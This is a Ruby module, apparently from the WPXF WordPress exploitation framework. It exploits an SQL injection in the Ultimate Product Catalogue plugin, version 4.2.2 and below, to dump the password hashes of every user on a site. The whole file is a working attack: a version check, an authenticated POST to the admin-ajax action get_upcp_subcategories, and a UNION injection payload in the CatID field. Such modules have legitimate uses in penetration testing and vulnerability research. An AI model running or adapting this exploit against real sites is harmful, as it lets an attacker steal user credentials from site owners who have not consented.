# frozen_string_literal: true

class Wpxf::Auxiliary::UltimateProductCatalogueHashDump < Wpxf::Module
  include Wpxf::WordPress::HashDump

  def initialize
    super

    update_info(
      name: 'Ultimate Product Catalogue <= 4.2.2 Authenticated Hash Dump',
      desc: %(
        Ultimate Product Catalogue <= 4.2.2 contains an SQL injection vulnerability
        which can be leveraged by all users with at least subscriber status. This
        module utilises this vulnerability to dump the hashed passwords of all
        users in the database.
      ),
      author: [
        'Lenon Leite', # Disclosure
        'rastating'    # WPXF module
      ],
      references: [
        ['WPVDB', '8853'],
        ['URL', 'http://lenonleite.com.br/en/blog/2017/05/31/english-ultimate-product-catalogue-4-2-2-sql-injection/']
      ],
      date: 'Jun 26 2017'
    )
  end

  def check
    check_plugin_version_from_changelog('ultimate-product-catalogue', 'readme.txt', '4.2.3')
  end

  def requires_authentication
    true
  end

  def hashdump_request_method
    :post
  end

  def hashdump_request_params
    { 'action' => 'get_upcp_subcategories' }
  end

  def hashdump_request_body
    { 'CatID' => "0 UNION #{hashdump_sql_statement}" }
  end

  def hashdump_visible_field_index
    0
  end

  def hashdump_number_of_cols
    2
  end

  def vulnerable_url
    wordpress_url_admin_ajax
  end
end
